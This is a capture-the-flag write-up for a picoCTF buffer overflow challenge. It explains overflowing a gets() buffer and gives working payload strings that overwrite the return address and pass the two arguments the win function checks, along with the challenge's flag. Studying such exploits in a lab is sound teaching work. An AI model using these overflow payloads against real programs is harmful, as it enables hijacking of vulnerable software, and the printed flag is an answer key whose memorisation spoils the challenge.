# Problem


# Solution
There is a dangrous gets() function in this program; you are able to overflow it enough to set a new return address. The buffer for the gets() is 100, so to overflow, it took 112 A's, here's the command to overflow and get to the return address: python -c "print('A'*112 + '\xcb\x85\x04\x08')". Without a flag.txt we will receive a "contact admins if you're on the shell server", since we are doing this locally, we need a flag.txt file of our own. Once we make a flag.txt file and run the exe with the command above, we get another segfault. If we take a look at the C code provided, the win function has a little if statement to check if our first and second argument are not equal to a given string; 0xDEADBEEF,0xDEADC0DE, if arg1 and arg2 are not equal we will return. So we need to supply arg1 and arg2 in little endian form and concatenate it to the rest of our python cmd, we also need to add 4 chars between the win return address and the first and second argumen.  python -c "print('A'*112 + '\xcb\x85\x04\x08' + 'CCCC' + '\xef\xbe\xad\xde' + '\xde\xc0\xad\xde')" | ./vuln

# Commands
**Useful commands for future buffer overflow challenges**  
python -c "print('A'*112 + '\xcb\x85\x04\x08')"  
arg 1 = 0xDEADBEEF (\xef\xbe\xad\xde)  
arg 2 = 0xDEADC0DE (\xde\xc0\xad\xde)  
readelf -s vuln (display all functions)  
dmesg | tail (great way to quickly figure out what's happening in a exe)  

# Flag
picoCTF{addr3ss3s_ar3_3asy30723282}


